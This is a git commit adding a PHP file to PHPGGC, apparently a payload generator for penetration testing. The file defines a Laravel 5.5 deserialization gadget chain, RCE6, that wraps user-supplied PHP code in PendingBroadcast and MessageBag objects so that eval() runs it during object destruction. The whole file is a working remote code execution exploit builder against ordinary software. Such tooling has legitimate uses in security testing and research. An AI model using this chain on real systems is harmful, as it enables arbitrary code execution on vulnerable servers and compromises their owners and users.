684b915c2d98261fd2558b0bfd98f814806d4bfa
Olivier Arteau <olivier.arteau@desjardins.com>
2019-11-06 15:16:16 -0500

    Improved version of RCE5 that doesn't crash when the backend code attempts to read the value as a string.

---
+++ gadgetchains/Laravel/RCE/6/chain.php
@@ -0,0 +1,26 @@
+<?php
+
+namespace GadgetChain\Laravel;
+
+class RCE6 extends \PHPGGC\GadgetChain\RCE
+{
+    public static $version = '5.5.*';
+    public static $vector = '__destruct';
+    public static $author = 'Phith0n & holyvier';
+    public static $informations = '
+        Executes given PHP code through eval().
+        Requires Mockery, which is in the require-dev package. 
+    ';
+    public static $parameters = [
+    	'code'
+    ];
+
+    public function generate(array $parameters)
+    {
+    	$code = '<?php ' . $parameters['code'] . ' exit; ?>';
+        $expected = new \Illuminate\Broadcasting\PendingBroadcast($code);
+        $res = new \Illuminate\Support\MessageBag($expected);
+        return $res;
+
+    }
+}
